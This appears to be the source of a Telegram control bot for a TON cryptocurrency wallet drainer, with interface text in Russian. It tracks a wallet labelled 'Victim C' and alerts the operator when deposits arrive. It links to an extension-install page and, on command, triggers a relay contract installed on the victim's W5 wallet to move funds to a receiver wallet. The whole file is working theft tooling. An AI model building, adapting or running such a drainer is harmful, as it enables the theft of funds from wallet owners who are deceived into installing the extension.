import "dotenv/config";
import { mnemonicToPrivateKey } from "@ton/crypto";
import { Address, beginCell, fromNano, internal, SendMode, toNano } from "@ton/core";
import { TonClient, WalletContractV5R1 } from "@ton/ton";
import { loadConfig } from "./utils.js";
import { networkGlobalId, requireEnv, tonClientOptions } from "./env.js";
import { mnemonicMatchesVictim, resolveVictimAddress } from "./victim.js";
import { resolveTriggerMnemonic } from "./payer.js";
import { isRelayExtensionInstalled } from "./extensions-check.js";
import { openW5FromMnemonic } from "./open-w5.js";
import { formatTonSendError } from "./ton-errors.js";

const BOT_TOKEN = process.env.BOT_TOKEN ?? "";
const CHAT_ID = process.env.CHAT_ID ?? "";
const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const POLL_MS = 1500;
const TX_POLL_MS = 10_000;
let offset = 0;

const lastSeenLt: Record<string, string> = {};

async function tgSend(chatId: string | number, text: string, keyboard?: any) {
  const body: any = {
    chat_id: chatId,
    text,
    parse_mode: "HTML",
    disable_web_page_preview: true,
  };
  if (keyboard) body.reply_markup = JSON.stringify(keyboard);
  await fetch(`${API}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
}

async function tgEdit(chatId: string | number, msgId: number, text: string, keyboard?: any) {
  const body: any = {
    chat_id: chatId,
    message_id: msgId,
    text,
    parse_mode: "HTML",
    disable_web_page_preview: true,
  };
  if (keyboard) body.reply_markup = JSON.stringify(keyboard);
  await fetch(`${API}/editMessageText`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
}

async function tgAnswer(callbackId: string, text?: string) {
  await fetch(`${API}/answerCallbackQuery`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ callback_query_id: callbackId, text }),
  });
}

/** ~0.08 TON gas to relay — opens Tonkeeper (no bot signature). */
function relayTonkeeperUrl(relayAddress: string) {
  const amount = 80_000_000;
  const dest = encodeURIComponent(relayAddress);
  return `https://app.tonkeeper.com/transfer/${dest}?amount=${amount}`;
}

function installPageUrl(): string | undefined {
  return process.env.PUBLIC_INSTALL_URL?.trim() || undefined;
}

function mainMenu(relayAddress?: string) {
  const rows: { text: string; callback_data?: string; url?: string }[][] = [];
  const installUrl = installPageUrl();
  if (installUrl) {
    rows.push([{ text: "📲 Install extension (TON Connect)", url: installUrl }]);
  }
  if (relayAddress) {
    rows.push([
      {
        text: "🔗 Списать через Tonkeeper",
        url: relayTonkeeperUrl(relayAddress),
      },
    ]);
  }
  rows.push(
    [{ text: "⚡ Списать (скрипт)", callback_data: "trigger" }],
    [{ text: "📋 Статус", callback_data: "diag" }],
  );
  return { inline_keyboard: rows };
}

function getClient() {
  return new TonClient(tonClientOptions());
}

async function runDiag(): Promise<string> {
  const ok = "✅";
  const no = "❌";
  const cfg = loadConfig();
  const network = networkGlobalId() === -3 ? "testnet" : "mainnet";
  const client = getClient();
  const victim = Address.parse(cfg.walletA);
  const relay = Address.parse(cfg.relayAddress);

  let victimEnvOk = false;
  let victimEnvLine = "—";
  try {
    const resolved = await resolveVictimAddress();
    victimEnvOk = resolved.equals(victim);
    victimEnvLine = process.env.WALLET_VICTIM?.trim()
      ? `WALLET_VICTIM ↔ config: ${victimEnvOk ? ok : no}`
      : `.env victim ↔ config: ${victimEnvOk ? ok : no}`;
  } catch (e: any) {
    victimEnvLine = `Victim .env: ${no} ${String(e.message || e).slice(0, 80)}`;
  }

  const mnMatch = await mnemonicMatchesVictim(victim);
  const installLine =
    mnMatch === null
      ? `Install: TON Connect (MNEMONIC_A не нужен)`
      : `MNEMONIC_A ↔ C: ${mnMatch ? ok : no}`;

  let balA = "—", balB = "—", balR = "—";
  try { balA = fromNano(await client.getBalance(victim)); } catch {}
  try { balB = fromNano(await client.getBalance(Address.parse(cfg.walletB))); } catch {}
  try { balR = fromNano(await client.getBalance(relay)); } catch {}

  let relayActive = false;
  try {
    const st = await client.getContractState(relay);
    relayActive = st.state === "active";
  } catch {}

  const extInstalled = await isRelayExtensionInstalled(client, victim, relay);

  let payerLine = "—";
  try {
    const triggerMn = resolveTriggerMnemonic();
    const triggerKey = await mnemonicToPrivateKey(triggerMn.split(/\s+/));
    const payer = WalletContractV5R1.create({
      walletId: { networkGlobalId: networkGlobalId() },
      publicKey: triggerKey.publicKey,
      workchain: 0,
    });
    let balT = "—";
    try { balT = fromNano(await client.getBalance(payer.address)); } catch {}
    const same = payer.address.equals(victim);
    payerLine = `<code>${payer.address.toString()}</code> (${balT} TON${same ? ", = C" : ""})`;
  } catch {
    payerLine = "ошибка мнемоники payer";
  }

  const lines = [
    `🔧 <b>W5 Extension Lab</b>`,
    `Сеть: <b>${network}</b>`,
    ``,
    `<b>📋 Кошельки</b>`,
    `Жертва C: <code>${cfg.walletA}</code>`,
    victimEnvLine,
    installLine,
    `Баланс C: <b>${balA} TON</b>`,
    ``,
    `Получатель B: <code>${cfg.walletB}</code>`,
    `Баланс B: <b>${balB} TON</b>`,
    ``,
    `<b>📡 Relay</b>`,
    `<code>${cfg.relayAddress}</code>`,
    `Активен: ${relayActive ? ok : no}`,
    `Баланс: <b>${balR} TON</b>`,
    ``,
    `<b>🔗 Extension</b>`,
    `Relay в dict: ${extInstalled ? ok : no}`,
    ``,
    `<b>⚡ Trigger payer</b>`,
    payerLine,
    ``,
    `Сумма (в relay): <b>${cfg.drainAmount} TON</b>`,
    ``,
    victimEnvOk && relayActive && extInstalled
      ? `${ok} <b>Всё в порядке</b>`
      : `⚠️ <b>Есть проблемы</b>`,
  ];

  return lines.join("\n");
}

async function runTrigger(): Promise<string> {
  const cfg = loadConfig();
  const relay = Address.parse(cfg.relayAddress);

  const triggerMn = resolveTriggerMnemonic();
  const client = getClient();
  const { key, wallet, opened } = await openW5FromMnemonic(client, triggerMn);

  await opened.sendTransfer({
    seqno: await opened.getSeqno(),
    secretKey: key.secretKey,
    timeout: Math.floor(Date.now() / 1000) + 600,
    messages: [
      internal({
        to: relay,
        value: toNano("0.08"),
        bounce: true,
        body: beginCell().storeUint(1, 32).endCell(),
      }),
    ],
    sendMode: SendMode.PAY_GAS_SEPARATELY | SendMode.IGNORE_ERRORS,
  });

  return [
    `⚡ <b>Списание отправлено</b>`,
    ``,
    `Relay: <code>${cfg.relayAddress}</code>`,
    `${cfg.walletA} → ${cfg.walletB}`,
    `Сумма (в relay): <b>${cfg.drainAmount} TON</b>`,
    ``,
    `⏳ Проверь баланс B через ~30 сек`,
  ].join("\n");
}

async function poll() {
  const url = `${API}/getUpdates?offset=${offset}&timeout=30`;
  let data: any;
  try {
    const res = await fetch(url);
    data = await res.json();
  } catch {
    return;
  }
  if (!data.ok || !data.result) return;

  for (const upd of data.result) {
    offset = upd.update_id + 1;

    if (upd.message) {
      const chatId = upd.message.chat.id;
      const text = upd.message.text || "";

      if (text === "/start" || text === "/menu") {
        const cfg = loadConfig();
        await tgSend(
          chatId,
          "🔧 <b>W5 Extension Lab</b>\n\n" +
            "1) Install: <b>TON Connect</b> (install.html) — seed C только в Tonkeeper.\n" +
            "2) Drain: <b>🔗 Списать через Tonkeeper</b> или index.html.\n\n" +
            "⚡ Скрипт — нужен <code>MNEMONIC_TRIGGER</code> (payer W5).",
          mainMenu(cfg.relayAddress),
        );
      } else if (text === "/diag" || text === "/status") {
        await tgSend(chatId, "⏳ Собираю данные...");
        const report = await runDiag();
        await tgSend(chatId, report, mainMenu(loadConfig().relayAddress));
      } else if (text === "/trigger" || text === "/drain") {
        await tgSend(chatId, "⏳ Отправляю транзакцию...");
        try {
          const result = await runTrigger();
          await tgSend(chatId, result, mainMenu(loadConfig().relayAddress));
        } catch (e: any) {
          const cfg = loadConfig();
          await tgSend(
            chatId,
            `❌ Скрипт: ${formatTonSendError(e).slice(0, 2800)}\n\n` +
              `Используй <b>🔗 Списать через Tonkeeper</b> в меню /menu`,
            mainMenu(cfg.relayAddress),
          );
        }
      }
    }

    if (upd.callback_query) {
      const cb = upd.callback_query;
      const chatId = cb.message.chat.id;
      const msgId = cb.message.message_id;

      if (cb.data === "diag") {
        await tgAnswer(cb.id, "Загрузка...");
        await tgEdit(chatId, msgId, "⏳ Собираю данные...");
        const report = await runDiag();
        await tgEdit(chatId, msgId, report, mainMenu(loadConfig().relayAddress));
      }

      if (cb.data === "trigger") {
        await tgAnswer(cb.id, "Отправляю...");
        await tgEdit(chatId, msgId, "⏳ Отправляю транзакцию...");
        try {
          const result = await runTrigger();
          await tgEdit(chatId, msgId, result, mainMenu(loadConfig().relayAddress));
        } catch (e: any) {
          const cfg = loadConfig();
          await tgEdit(
            chatId,
            msgId,
            `❌ Скрипт: ${formatTonSendError(e).slice(0, 2800)}\n\n` +
              `Жми <b>🔗 Списать через Tonkeeper</b> — /menu`,
            mainMenu(cfg.relayAddress),
          );
        }
      }
    }
  }
}

interface WatchedWallet {
  label: string;
  address: string;
}

function toncenterRest(): string {
  const ep = requireEnv("TON_ENDPOINT");
  return ep.replace(/\/jsonRPC\/?$/, "");
}

async function fetchTransactions(addr: string, limit = 5): Promise<any[]> {
  const base = toncenterRest();
  const apiKey = process.env.TONCENTER_API_KEY?.trim();
  const url = `${base}/getTransactions?address=${encodeURIComponent(addr)}&limit=${limit}` +
    (apiKey ? `&api_key=${apiKey}` : "");
  const res = await fetch(url);
  const json: any = await res.json();
  if (!json.ok) return [];
  return json.result || [];
}

async function checkDeposits(wallets: WatchedWallet[]) {
  for (const w of wallets) {
    try {
      const txs = await fetchTransactions(w.address, 10);
      if (!txs.length) continue;

      const prevLt = lastSeenLt[w.address];

      if (!prevLt) {
        lastSeenLt[w.address] = txs[0].transaction_id.lt;
        continue;
      }

      const fresh = [];
      for (const tx of txs) {
        if (tx.transaction_id.lt === prevLt) break;
        fresh.push(tx);
      }

      if (fresh.length) {
        lastSeenLt[w.address] = fresh[0].transaction_id.lt;
      }

      for (const tx of fresh) {
        const inMsg = tx.in_msg;
        if (!inMsg || !inMsg.value || Number(inMsg.value) === 0) continue;

        const amount = fromNano(inMsg.value);
        const from = inMsg.source || "unknown";
        const shortFrom = from.length > 20
          ? from.slice(0, 10) + "…" + from.slice(-6)
          : from;

        await tgSend(
          CHAT_ID,
          [
            `💰 <b>Пополнение ${w.label}</b>`,
            ``,
            `Сумма: <b>${amount} TON</b>`,
            `От: <code>${shortFrom}</code>`,
            `Кошелёк: <code>${w.address.slice(0, 12)}…</code>`,
          ].join("\n"),
        );
      }
    } catch (e) {
      console.error(`Deposit check error [${w.label}]:`, e);
    }
  }
}

async function main() {
  console.log("W5 Extension Bot запущен");

  await fetch(`${API}/deleteWebhook`);

  const cfg = loadConfig();

  const watched: WatchedWallet[] = [
    { label: "Victim C", address: cfg.walletA },
    { label: "Receiver B", address: cfg.walletB },
  ];

  await tgSend(CHAT_ID, "🟢 <b>Бот запущен</b>\n\nМониторинг: C, B");
  console.log("Мониторинг:", watched.map((w) => `${w.label} ${w.address}`).join(", "));

  let lastTxCheck = 0;

  while (true) {
    try {
      await poll();
    } catch (e) {
      console.error("Poll error:", e);
    }

    const now = Date.now();
    if (now - lastTxCheck >= TX_POLL_MS) {
      lastTxCheck = now;
      try {
        await checkDeposits(watched);
      } catch (e) {
        console.error("Deposit monitor error:", e);
      }
    }

    await new Promise((r) => setTimeout(r, POLL_MS));
  }
}

main();
